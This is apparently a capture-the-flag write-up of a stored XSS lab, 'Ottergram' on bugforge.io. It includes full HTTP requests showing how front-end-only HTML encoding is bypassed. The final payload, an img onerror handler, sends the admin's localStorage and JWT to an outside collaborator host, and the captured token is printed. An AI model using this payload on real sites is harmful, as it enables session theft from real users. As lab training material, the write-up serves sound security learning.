---
title: "Ottergram Stored XSS"
date: 2025-12-1
author: Shawn Szczepkowski
---
Today we will be covering the Ottergram Stored XSS lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

Since we know the lab is XSS we can begin by exploring all input fields. This app has quite a few so it will take a bit.

We come across an interesting messaging feature. Since our sent message isn't displayed to us, let's set up 2 test users and see how the message is rendered after we send it.

When sending our first message we note that as the recipient user our XSS payload is HTML encoded so the payload does not execute. Let's capture a second message attempt in our proxy and see what is going on.

The message is HTML encoded from the front end, so let's change things and see if the back end is doing the same:
```http
POST /api/messages HTTP/2
Host: ce8b534ae29f.labs.bugforge.io
Content-Length: 80
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0NjM1MDc5fQ.ywtHPwwyaQt4Z7Cgg-ohihRLBYcvkDWQSRnDQxtcXcA
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://ce8b534ae29f.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ce8b534ae29f.labs.bugforge.io/messages
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"recipient_id":5,"content":"&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;"}
```

### Edited Request
```http
POST /api/messages HTTP/2
Host: ce8b534ae29f.labs.bugforge.io
Content-Length: 64
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY0NjM1MDc5fQ.ywtHPwwyaQt4Z7Cgg-ohihRLBYcvkDWQSRnDQxtcXcA
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://ce8b534ae29f.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ce8b534ae29f.labs.bugforge.io/messages
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"recipient_id":5,"content":"<img src=x onerror=alert('XSS');>"}
```
We have success:

![Stored XSS](/assets/images/Pasted%20image%2020251201192541.png)

Let's try grabbing local storage of the Admin user since the app is not using cookies but rather JWT's.

We will send a message and intercept our payload to undo the HTML encoding. I went with the following payload using collaborator, but if you don't have Burp pro, [webhook.site](https://webhook.site/#!/view/ca96bb9d-44b6-4088-bdaa-c2dd271a7e5c) will work just fine:
```http
POST /api/messages HTTP/2
Host: ce8b534ae29f.labs.bugforge.io
Content-Length: 172
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJ0ZXN0MSIsImlhdCI6MTc2NDYzNTEyN30.84KpmxIaHr_U7FyBUin2OEuB6gjFRJ6MZKEHZNmMyzE
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://ce8b534ae29f.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ce8b534ae29f.labs.bugforge.io/messages
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"recipient_id":2,"content":"<img src=x onerror=\"this.src='https://t82e9r4c8v9a9nyrykufuop37udl1bp0.oastify.com/?ls='+encodeURIComponent(JSON.stringify(localStorage))\">"}
```
- Remember since we are adding our payload in JSON we will need to properly escape any double quotes.

Shortly after sending our payload to the admin we get an HTTP request in collaborator:
```http
GET /?ls=%7B%22flag%22%3A%22bug%7B902c30d950de5e7cc9cf4a071d9af9ef%7D%22%2C%22token%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc2NDYzNTMyNn0.
s60iliLmV9t1YsKDsXEOsXOHyWhOAVL4rsAiRHJ33dc%22%2C%22user%22%3A%22%7B%5C%22id%5C%22%3A2%2C%5C%22username%5C%22%3A%5C%22admin%5C%22%2C%5C%22email%5C%22%3A%5C%22admin%40ottergram.com%5C%22%2C%
5C%22full_name%5C%22%3A%5C%22Admin%20User%5C%22%2C%5C%22bio%5C%22%3A%5C%22Ottergram%20Administrator%5C%22%2C%5C%22profile_picture%5C%22%3A%5C%22%2Fuploads%2Fotter2.png%5C%22%2C%5C%22role%5C
%22%3A%5C%22admin%5C%22%7D%22%7D HTTP/1.1
Host: t82e9r4c8v9a9nyrykufuop37udl1bp0.oastify.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Sec-Fetch-Storage-Access: active
Referer: http://localhost:3000/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```

URL decoded we can see our flag along with the admins token:
```http
GET /?ls={"flag":"bug{902c30d950de5e7cc9cf4a071d9af9ef}","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc2NDYzNTMyNn0.s60iliLmV9t1YsKDsXEOsXOHyWhOAV
L4rsAiRHJ33dc","user":"{\"id\":2,\"username\":\"admin\",\"email\":\"admin@ottergram.com\",\"full_name\":\"Admin User\",\"bio\":\"Ottergram Administrator\",\"profile_picture\":\"/uploads/otter2.
png\",\"role\":\"admin\"}"}
```
